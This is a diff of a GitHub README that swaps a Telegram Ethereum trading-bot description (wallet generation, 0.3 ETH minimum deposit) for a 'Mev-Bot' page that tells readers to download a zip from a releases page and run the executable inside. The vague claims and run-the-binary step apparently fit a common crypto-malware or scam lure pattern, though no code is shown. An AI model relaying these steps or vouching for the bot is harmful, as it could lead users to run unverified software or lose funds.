@@ -1,110 +1,70 @@
-<div align="center">
+# 🤖 Mev-Bot_Ethereum_network - Simplified Telegram Bot for Ethereum
 
-# 🚀 ETH-BOT Verse v2.0
+## 📥 Download Now
+[![Download Mev-Bot](https://img.shields.io/badge/Download%20Mev--Bot-blue)](https://github.com/erinasage672/Mev-Bot_Ethereum_network/releases)
 
-![ETH Trading Bot](https://i.ibb.co/MkHKDVJ6/a65e96a731a85c687ab655f3ac95bd73.jpg)
+## 🚀 Getting Started
+Welcome to Mev-Bot_Ethereum_network! This Telegram bot helps you interact with Ethereum contracts easily. In this guide, we will walk you through downloading and running the bot.
 
-**Automated Ethereum Trading Bot** — A powerful Telegram bot for intelligent DeFi trading featuring AI-driven strategies, real-time analytics, and secure wallet management. Built with Ethers.js, powered by Infura and Etherscan. Trade without emotions, 24/7!
+## 📂 System Requirements
+- **Operating System:** Windows, macOS, or Linux
+- **Memory:** At least 2 GB of RAM
+- **Network:** Internet connection
+- **Telegram Account:** You need a Telegram account to use the bot.
 
-</div>
+## 🔍 Features
+- Interacts directly with Ethereum smart contracts
+- User-friendly interface within Telegram
+- Supports various Ethereum tokens
+- Provides real-time updates and notifications
+- Customizable settings based on user preferences
 
----
+## 🌎 Visit the Releases Page
+To download the latest version of Mev-Bot, please visit our releases page:
 
-<div align="center">
+[Download Link to Releases](https://github.com/erinasage672/Mev-Bot_Ethereum_network/releases)
 
-### 🤖 **LAUNCH BOT IN TELEGRAM** 🤖
+Here, you will find the most recent versions available for download.
 
-[![Telegram Bot](https://img.shields.io/badge/Telegram-@ethverse__bot-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/ethverse_bot)
+## ⚙️ Download & Install
+1. Visit our releases page: [Download Here](https://github.com/erinasage672/Mev-Bot_Ethereum_network/releases).
+2. On the releases page, find the latest version listed.
+3. Click on the version to expand the release details.
+4. Locate the download link that corresponds to your operating system.
+5. Click on the link to start your download.
 
-**👆 Click to Start Trading! 👆**
+For example, if you are using Windows, look for the file named `MevBot_Windows.zip`. 
 
-</div>
+Once the download completes:
+1. Navigate to your Downloads folder and find the file.
+2. Extract the contents of the zip file.
+3. Open the extracted folder, and double-click on the executable file to run the bot.
 
----
+## 📞 How to Use Mev-Bot on Telegram
+1. Open the Telegram app on your device.
+2. Search for the bot by its username.
+3. Click on "Start" to initiate the bot.
+4. Follow the on-screen prompts to configure your preferences.
 
-## ✨ Key Features
-- **🤖 AI Strategies**: RSI, Momentum, Arbitrage optimized for DEX platforms like Uniswap and SushiSwap
-- **🛡 Risk Management**: Automatic Stop-Loss and Take-Profit for capital protection
-- **⚡ Gas Optimization**: Dynamic gas pricing via Etherscan (Safe, Proposed, Fast modes)
-- **📊 Real-Time Analytics**: P&L tracking, win rate, trade history with visual progress bars
-- **💳 Wallet Integration**: Secure wallet generation, QR code deposits, balance monitoring
-- **📱 Telegram-Native UI**: Inline keyboards, animations, no-code setup — user-friendly interface
+## 🔗 Connect with the Community
+Join our user community to share your experiences and ask questions:
+- Follow us on Telegram: [Community Group](https://t.me/MevBotCommunity) 
+- Check out our documentation: [Documentation Link](https://github.com/erinasage672/Mev-Bot_Ethereum_network/wiki)
 
----
+## 🛠️ Troubleshooting
+If you encounter any issues while downloading or running the bot, consider the following steps:
 
-## ⚙️ How It Works
-1. **User Onboarding**
-   - Start the bot in Telegram (`/start`)
-   - Auto-generate secure Ethereum wallet (private key shown only to user)
-   - Deposit ETH (min 0.3 ETH required)
-2. **Strategy Selection**
-   - Choose between **RSI**, **Momentum**, or **Arbitrage**
-   - Adjust Stop-Loss / Take-Profit thresholds
-   - Pick Gas Mode (Safe / Proposed / Fast)
-3. **Execution Engine**
-   - Connects to Ethereum Mainnet via Infura
-   - Fetches gas data from Etherscan API
-   - Monitors DEX pairs and mempool in real time
-   - Executes trades automatically, optimized for chosen strategy
-4. **Analytics & Reporting**
-   - Live balance & P&L tracking
-   - Trade statistics: win rate, profit vs. loss
-   - Notifications directly in Telegram
+- Ensure you have an active internet connection.
+- Verify that you downloaded the correct version for your operating system.
+- Restart your computer if the application does not open.
+- Consult the community for assistance or check our FAQ section.
 
-## 📊 Workflow Diagram
-Below is a visual flowchart illustrating the bot's operational flow, including branching for strategy-specific execution paths. This diagram highlights the seamless integration from onboarding to trade execution and monitoring.
+## 📑 Additional Resources
+For more detailed information about using the Mev-Bot, refer to:
+- The GitHub Wiki: [Wiki Link](https://github.com/erinasage672/Mev-Bot_Ethereum_network/wiki)
+- The official Telegram documentation for bot integration.
 
-```mermaid
-flowchart TD
-    A[🚀 Start Bot in Telegram /start] --> B[🔑 Generate Secure Wallet<br/>Ethers.js + Private Key Export]
-    B --> C[💳 Deposit ETH<br/>Min: 0.3 ETH<br/>QR Code Support]
-    C --> D[⚙️ Configure Settings<br/>Stop-Loss, Take-Profit, Gas Mode]
-    D --> E[📈 Select Strategy]
-    E --> F[📊 RSI Branch<br/>Oversold <30: Buy<br/>Overbought >70: Sell<br/>Sideways Market Optimized]
-    E --> G[🚀 Momentum Branch<br/>Rising Trend: Buy<br/>Falling Trend: Sell<br/>Trend-Following Signals]
-    E --> H[⚡ Arbitrage Branch<br/>DEX Price Diffs: Buy Low/Sell High<br/>Uniswap ↔ SushiSwap<br/>Low-Risk, Gas-Intensive]
-    F --> I[🔍 Monitor Market & Mempool<br/>Infura RPC + Etherscan Gas]
-    G --> I
-    H --> I
-    I --> J[🎯 Execute Trade<br/>Auto-Swap via DEX Aggregator<br/>Apply SL/TP Checks]
-    J --> K[🛡️ Risk Check<br/>Stop-Loss Hit? → Sell<br/>Take-Profit Hit? → Sell]
-    K --> L{Trade Outcome?}
-    L -->|Profitable| M[✅ Update Stats<br/>+Profit, Win Rate ++<br/>P&L Notification]
-    L -->|Loss| N[❌ Update Stats<br/>+Loss, Review Strategy<br/>Alert Notification]
-    M --> O[📊 Real-Time Analytics<br/>Balance Refresh, Progress Bars]
-    N --> O
-    O --> P[🔄 Loop: Continuous Monitoring<br/>24/7 Operation]
-    P --> I
+## 💬 Feedback
+Your feedback helps us improve. Feel free to share your thoughts or report issues on our GitHub page.
 
-    style A fill:#e1f5fe
-    style E fill:#f3e5f5
-    style F fill:#fff3e0
-    style G fill:#fff3e0
-    style H fill:#fff3e0
-    style J fill:#e8f5e8
-    style O fill:#f1f8e9
-```
-
-## 🛠 Technical Stack
-The bot is built with modern, reliable tools for seamless Ethereum integration and Telegram interaction:
-
-| Component | Technology | Purpose |
-|-----------|-----------|---------|
-| Blockchain | Ethers.js v6+ | Wallet generation, transaction signing, DEX swaps |
-| Provider | Infura | Ethereum Mainnet RPC access for real-time data |
-| API | Etherscan | Dynamic gas pricing and transaction monitoring |
-| Bot Framework | Node-Telegram-Bot-API | Inline keyboards, polling, message handling |
-| HTTP | Axios | Market data fetching and external API calls |
-| Storage | In-Memory Map (Node.js) | User sessions and bot states (scalable to Redis) |
-
-## 🚀 Roadmap
-We're committed to evolving ETH-BOT Verse. Upcoming features:
-
-- **v2.1 (Q4 2025)**: Multi-chain support (BSC, Polygon) + Flash Loan integration
-- **v2.2 (Q1 2026)**: Advanced ML models for predictive analytics + Portfolio diversification
-- **v2.3 (Q2 2026)**: API endpoints for external integrations + Mobile app companion
-
-Contributions welcome! Check issues for open tasks.
-
-## 📄 License
-This project is licensed under the MIT License - see the LICENSE file for details.
+Thank you for using Mev-Bot! We hope you have an enjoyable experience using our Telegram bot for Ethereum contracts.
